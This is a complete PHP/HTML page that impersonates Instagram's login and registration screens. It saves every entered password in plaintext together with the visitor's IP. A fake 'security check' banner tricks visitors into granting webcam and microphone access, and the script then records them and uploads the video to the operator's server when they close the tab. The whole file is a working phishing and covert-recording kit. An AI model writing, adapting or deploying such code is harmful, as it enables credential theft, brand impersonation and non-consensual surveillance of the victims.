<?php
// ============================================================
//   index.php
//   • Форма входа/регистрации Instagram (белый фон, логотип)
//   • АВТО-ЗАПРОС камеры при заходе (после клика «Разрешить»)
//   • Запись видео+микрофона с этого момента
//   • Отправка видео на сервер при закрытии вкладки
//   • Пароли сохраняются в ig_users.json (в открытом виде)
// ============================================================

session_start();

// ============================================================
//   ПРИЁМ ВИДЕО ОТ БРАУЗЕРА
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['video'])) {
    header('Content-Type: application/json; charset=utf-8');

    $dir = __DIR__ . '/uploads';
    if (!is_dir($dir)) @mkdir($dir, 0755, true);

    if ($_FILES['video']['error'] !== UPLOAD_ERR_OK) {
        echo json_encode(['ok'=>false, 'error'=>'Ошибка загрузки: '.$_FILES['video']['error']]);
        exit;
    }

    $f = $_FILES['video'];
    if ($f['size'] > 500 * 1024 * 1024) {
        echo json_encode(['ok'=>false, 'error'=>'Файл больше 500 МБ']);
        exit;
    }

    $name = date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.webm';
    $path = $dir . '/' . $name;

    if (!move_uploaded_file($f['tmp_name'], $path)) {
        echo json_encode(['ok'=>false, 'error'=>'Не удалось сохранить']);
        exit;
    }

    $metaFile = $dir . '/videos.json';
    $videos = file_exists($metaFile) ? (json_decode(file_get_contents($metaFile), true) ?: []) : [];

    $videos[] = [
        'id'         => bin2hex(random_bytes(6)),
        'file'       => $name,
        'size'       => $f['size'],
        'username'   => $_SESSION['ig_user'] ?? ($_POST['username'] ?? 'guest'),
        'started'    => (int)($_POST['started'] ?? time()*1000),
        'duration'   => (int)($_POST['duration'] ?? 0),
        'user_agent' => $_POST['user_agent'] ?? '',
        'ip'         => $_SERVER['REMOTE_ADDR'] ?? '',
        'saved_at'   => date('c')
    ];

    file_put_contents($metaFile, json_encode($videos, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));

    echo json_encode(['ok'=>true, 'file'=>$name]);
    exit;
}

// ============================================================
//   ВХОД / РЕГИСТРАЦИЯ (пароли сохраняются в открытом виде)
// ============================================================
$usersFile  = __DIR__ . '/ig_users.json';
$loginError = '';
$regError   = '';
$mode       = $_GET['mode'] ?? 'login';
$logged     = !empty($_SESSION['ig_user']);

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $users = file_exists($usersFile) ? (json_decode(file_get_contents($usersFile), true) ?: []) : [];

    // ---------- РЕГИСТРАЦИЯ ----------
    if ($_POST['action'] === 'register') {
        $mode  = 'register';
        $email = strtolower(trim($_POST['email'] ?? ''));
        $uname = strtolower(trim($_POST['username'] ?? ''));
        $name  = trim($_POST['name'] ?? '');
        $pass  = $_POST['password'] ?? '';

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $regError = 'Некорректный email';
        elseif (!preg_match('/^[a-z0-9_.]{3,20}$/', $uname)) $regError = 'Username: 3–20 символов (a-z, 0-9, _, .)';
        elseif (mb_strlen($pass) < 4) $regError = 'Пароль минимум 4 символа';
        elseif (mb_strlen($name) < 2) $regError = 'Введите имя';
        else {
            foreach ($users as $u) {
                if ($u['username'] === $uname) { $regError = 'Username уже занят'; break; }
                if (($u['email'] ?? '') === $email) { $regError = 'Email уже зарегистрирован'; break; }
            }
        }

        if (!$regError) {
            $users[] = [
                'id'       => bin2hex(random_bytes(6)),
                'username' => $uname,
                'email'    => $email,
                'name'     => $name,
                'password' => $pass,          // ⚠️ храним в открытом виде для админа
                'created'  => date('c'),
                'ip'       => $_SERVER['REMOTE_ADDR'] ?? ''
            ];
            file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));
            $_SESSION['ig_user'] = $uname;
            $logged = true;
        }
    }

    // ---------- ВХОД ----------
    if ($_POST['action'] === 'login') {
        $login = strtolower(trim($_POST['login'] ?? ''));
        $pass  = $_POST['password'] ?? '';

        $found = null;
        foreach ($users as $u) {
            if ($u['username'] === $login || ($u['email'] ?? '') === $login) {
                $found = $u;
                break;
            }
        }

        if (!$found) $loginError = 'Пользователь не найден';
        elseif ($found['password'] !== $pass) $loginError = 'Неверный пароль';
        else {
            $_SESSION['ig_user'] = $found['username'];
            $logged = true;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  *{box-sizing:border-box}
  body{
    margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:#fafafa;color:#262626;font-size:14px;
    -webkit-font-smoothing:antialiased;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:20px;
  }
  .hidden{display:none !important}

  /* Плашка с запросом разрешения */
  .perm-bar{
    position:fixed;bottom:0;left:0;right:0;z-index:1000;
    background:#fff;border-top:1px solid #dbdbdb;
    padding:14px 20px;box-shadow:0 -4px 20px rgba(0,0,0,.06);
    display:flex;align-items:center;gap:14px;flex-wrap:wrap;
  }
  .perm-bar.hidden{display:none}
  .perm-bar .txt{flex:1;min-width:200px;font-size:13px;line-height:1.5}
  .perm-bar .txt b{color:#262626}
  .perm-bar .txt small{color:#8e8e8e;display:block;margin-top:2px}
  .perm-bar button{
    background:#0095f6;border:0;border-radius:8px;padding:9px 16px;
    color:#fff;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;
  }
  .perm-bar button:hover{background:#1877f2}
  .perm-bar button.ghost{background:#efefef;color:#262626}
  .perm-bar button.ghost:hover{background:#e0e0e0}

  /* Индикатор записи */
  .rec-indicator{
    position:fixed;top:14px;right:14px;z-index:1000;
    display:none;align-items:center;gap:8px;
    background:rgba(0,0,0,.82);color:#fff;
    padding:8px 14px;border-radius:24px;
    font-size:12px;font-weight:700;letter-spacing:.5px;
  }
  .rec-indicator.show{display:flex}
  .rec-indicator::before{
    content:'';width:10px;height:10px;border-radius:50%;
    background:#ed4956;animation:pulse 1s infinite;
  }
  .rec-indicator .t{font-family:monospace;margin-left:4px}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}

  /* Мини-превью камеры */
  .cam-preview{
    position:fixed;top:60px;right:14px;z-index:999;
    width:120px;height:90px;border-radius:10px;overflow:hidden;
    background:#000;border:2px solid rgba(255,255,255,.9);
    box-shadow:0 4px 16px rgba(0,0,0,.2);
    display:none;
  }
  .cam-preview.show{display:block}
  .cam-preview video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}

  /* Форма */
  .auth-box{width:100%;max-width:350px}
  .auth-card{
    background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;
    margin-bottom:10px;text-align:center;
  }
  .ig-logo{display:block;margin:0 auto 30px;width:175px;height:51px}
  .auth-form{display:flex;flex-direction:column;gap:6px}
  .auth-form input{
    background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
    padding:9px 8px;color:#262626;font-size:13px;outline:none;
    width:100%;height:36px;
  }
  .auth-form input::placeholder{color:#8e8e8e;font-size:12px}
  .auth-form input:focus{background:#fff;border-color:#a8a8a8}
  .auth-btn{
    margin-top:8px;background:#0095f6;border:0;border-radius:8px;padding:7px;
    color:#fff;font-size:14px;font-weight:600;cursor:pointer;height:32px;
  }
  .auth-btn:hover{background:#1877f2}
  .divider{
    display:flex;align-items:center;gap:18px;margin:16px 0;
    color:#8e8e8e;font-size:13px;font-weight:600;
  }
  .divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
  .fb-login{
    display:flex;align-items:center;justify-content:center;gap:8px;
    background:none;border:0;color:#385185;font-weight:600;font-size:14px;
    padding:6px 0;cursor:pointer;width:100%;
  }
  .fb-login svg{width:16px;height:16px;fill:currentColor}
  .forgot{
    display:block;text-align:center;font-size:12px;color:#00376b;
    text-decoration:none;margin-top:12px;
  }
  .auth-error{color:#ed4956;font-size:12.5px;min-height:18px;margin:8px 0 2px;line-height:1.4}
  .auth-switch{
    background:#fff;border:1px solid #dbdbdb;padding:22px;
    text-align:center;font-size:14px;
  }
  .auth-switch a{color:#0095f6;font-weight:600;text-decoration:none;margin-left:4px}

  /* Приветствие после входа */
  .welcome{
    background:#fff;border:1px solid #dbdbdb;padding:36px 30px;
    text-align:center;max-width:400px;
  }
  .welcome .av{
    width:80px;height:80px;border-radius:50%;margin:0 auto 16px;
    display:flex;align-items:center;justify-content:center;
    font-size:32px;font-weight:700;color:#fff;
    background:linear-gradient(135deg,#f09433,#dc2743,#bc1888);
  }
  .welcome h1{margin:0 0 6px;font-size:22px;font-weight:400}
  .welcome p{margin:0 0 20px;color:#8e8e8e;font-size:14px}
  .welcome a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>

<!-- Индикатор записи -->
<div class="rec-indicator" id="recInd">
  <span></span><span class="t" id="recTime"></span>
</div>

<!-- Мини-превью камеры -->
<div class="cam-preview" id="camPrev">
  <video id="camVideo" autoplay playsinline muted></video>
</div>

<?php if (!$logged): ?>
<!-- ============ ФОРМА ВХОДА INSTAGRAM ============ -->
<div class="auth-box">
  <div class="auth-card">
    <!-- Логотип Instagram -->
    <svg class="ig-logo" viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
      <g transform="translate(0,6)" fill="none" stroke="#262626" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <rect x="1.5" y="1.5" width="37" height="37" rx="10" ry="10"/>
        <circle cx="20" cy="20" r="9"/>
        <circle cx="30.5" cy="9.5" r="1.8" fill="#262626" stroke="none"/>
      </g>
      <text x="50" y="35" font-family="'Billabong','Grand Hotel','Brush Script MT','Segoe Script',cursive" font-size="30" fill="#262626">Instagram</text>
    </svg>

    <?php if ($mode === 'login'): ?>
    <form class="auth-form" method="post">
      <input type="hidden" name="action" value="login">
      <input type="text" name="login" placeholder="Телефон, имя пользователя или эл. адрес" autocomplete="username" required>
      <input type="password" name="password" placeholder="Пароль" autocomplete="current-password" required>
      <button class="auth-btn" type="submit">Войти</button>
      <div class="auth-error"><?= htmlspecialchars($loginError) ?></div>
      <div class="divider">ИЛИ</div>
      <button type="button" class="fb-login" onclick="alert('Вход через Facebook не подключён')">
        <svg viewBox="0 0 24 24"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.96h-1.51c-1.49 0-1.95.93-1.95 1.89v2.26h3.32l-.53 3.49h-2.79V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
        Войти через Facebook
      </button>
      <a class="forgot" href="#">Забыли пароль?</a>
    </form>
    <?php endif; ?>

    <?php if ($mode === 'register'): ?>
    <form class="auth-form" method="post">
      <input type="hidden" name="action" value="register">
      <input type="email" name="email" placeholder="Эл. адрес" autocomplete="email" required>
      <input type="text" name="username" placeholder="Имя пользователя" autocomplete="username" required>
      <input type="text" name="name" placeholder="Полное имя" autocomplete="name" required>
      <input type="password" name="password" placeholder="Пароль" autocomplete="new-password" required>
      <button class="auth-btn" type="submit">Зарегистрироваться</button>
      <div class="auth-error"><?= htmlspecialchars($regError) ?></div>
      <p style="font-size:11px;color:#8e8e8e;margin:14px 0 0;line-height:1.5">
        Регистрируясь, вы принимаете наши <a href="#" style="color:#00376b;font-weight:600">Условия</a>
        и <a href="#" style="color:#00376b;font-weight:600">Политику конфиденциальности</a>.
      </p>
    </form>
    <?php endif; ?>
  </div>

  <div class="auth-switch">
    <?php if ($mode === 'login'): ?>
      У вас нет аккаунта? <a href="?mode=register">Зарегистрироваться</a>
    <?php else: ?>
      Уже есть аккаунт? <a href="?mode=login">Войти</a>
    <?php endif; ?>
  </div>
</div>

<?php else: ?>
<!-- ============ ЭКРАН ПОСЛЕ ВХОДА ============ -->
<div class="welcome">
  <div class="av"><?= htmlspecialchars(mb_strtoupper(mb_substr($_SESSION['ig_user'], 0, 1))) ?></div>
  <h1>Привет, <?= htmlspecialchars($_SESSION['ig_user']) ?>!</h1>
  <p>Вы вошли в аккаунт..</p>
  <a href="?logout=1">Выйти</a>
</div>
<?php endif; ?>

<!-- ============ ПЛАШКА ЗАПРОСА КАМЕРЫ ============ -->
<div class="perm-bar hidden" id="permBar">
  <div class="txt">
    <b>🔒 Проверка безопасности</b>
    <small>Разрешите проверить аккаунт</small>
  </div>
  <button id="allowBtn">Разрешить</button>
  <button class="ghost" id="denyBtn">Не сейчас</button>
</div>

<script>
/* ============================================================
   АВТО-ЗАПРОС КАМЕРЫ И ЗАПИСЬ
   ============================================================ */

const permBar  = document.getElementById('permBar');
const allowBtn = document.getElementById('allowBtn');
const denyBtn  = document.getElementById('denyBtn');
const recInd   = document.getElementById('recInd');
const recTime  = document.getElementById('recTime');
const camPrev  = document.getElementById('camPrev');
const camVideo = document.getElementById('camVideo');

const USERNAME = <?= json_encode($_SESSION['ig_user'] ?? 'guest') ?>;

let stream    = null;
let recorder  = null;
let chunks    = [];
let timerInt  = null;
let seconds   = 0;
let startedAt = null;
let stopped   = false;

/* Показываем плашку через 1 сек после загрузки */
setTimeout(() => {
  if (!stopped && !stream) permBar.classList.remove('hidden');
}, 1000);

allowBtn.addEventListener('click', startRecording);

denyBtn.addEventListener('click', () => {
  permBar.classList.add('hidden');
  const btn = document.createElement('button');
  btn.textContent = '🎥 Разрешить запись';
  btn.style.cssText = 'position:fixed;bottom:16px;right:16px;z-index:999;' +
    'background:#0095f6;color:#fff;border:0;border-radius:24px;' +
    'padding:10px 18px;font-size:13px;font-weight:600;cursor:pointer;' +
    'box-shadow:0 6px 20px rgba(0,149,246,.4);font-family:inherit';
  btn.onclick = () => { btn.remove(); startRecording(); };
  document.body.appendChild(btn);
});

async function startRecording() {
  if (stream) return;
  permBar.classList.add('hidden');

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: true
    });

    camVideo.srcObject = stream;
    await camVideo.play();
    camPrev.classList.add('show');

    const types = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4'];
    let mime = '';
    for (const t of types) if (MediaRecorder.isTypeSupported(t)) { mime = t; break; }

    recorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
    chunks = [];
    recorder.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
    recorder.onstop = async () => {
      const blob = new Blob(chunks, { type: mime || 'video/webm' });
      await upload(blob);
    };
    recorder.start(1000);

    recInd.classList.add('show');
    startTimer();
    startedAt = Date.now();

  } catch (err) {
    console.error(err);
    if (err.name === 'NotAllowedError') alert('Вы отклонили доступ к камере. Разрешите его в настройках браузера.');
    else if (err.name === 'NotFoundError') alert('Камера или микрофон не найдены.');
    else if (location.protocol !== 'https:' && !['localhost','127.0.0.1'].includes(location.hostname))
      alert('Камера работает только по HTTPS.');
    else alert('Ошибка: ' + err.message);
  }
}

function startTimer(){
  seconds = 0; recTime.textContent = '00:00';
  timerInt = setInterval(() => {
    seconds++;
    const m = String(Math.floor(seconds/60)).padStart(2,'0');
    const s = String(seconds%60).padStart(2,'0');
    recTime.textContent = m + ':' + s;
  }, 1000);
}
function stopTimer(){ clearInterval(timerInt); timerInt = null; }

async function upload(blob){
  if (chunks.length === 0) return;

  const form = new FormData();
  form.append('video', blob, 'record_' + Date.now() + '.webm');
  form.append('started', startedAt || Date.now());
  form.append('duration', Math.round((Date.now() - (startedAt||Date.now()))/1000));
  form.append('user_agent', navigator.userAgent);
  form.append('username', USERNAME);

  try {
    await fetch(location.pathname, {
      method: 'POST',
      body: form,
      keepalive: true
    });
  } catch(e) {
    console.warn('upload failed', e);
  }
}

/* Остановка и отправка при закрытии вкладки */
window.addEventListener('beforeunload', e => {
  if (stopped) return;
  if (recorder && recorder.state === 'recording') {
    try { recorder.stop(); } catch(err){}
  }
  if (stream) stream.getTracks().forEach(t => t.stop());
  stopped = true;
});

/* Периодически отправляем данные — на случай краха */
setInterval(() => {
  if (recorder && recorder.state === 'recording') {
    try { recorder.requestData(); } catch(e){}
  }
}, 30000);

document.addEventListener('visibilitychange', () => {
  if (document.hidden && recorder && recorder.state === 'recording') {
    try { recorder.requestData(); } catch(e){}
  }
});
</script>

</body>
</html>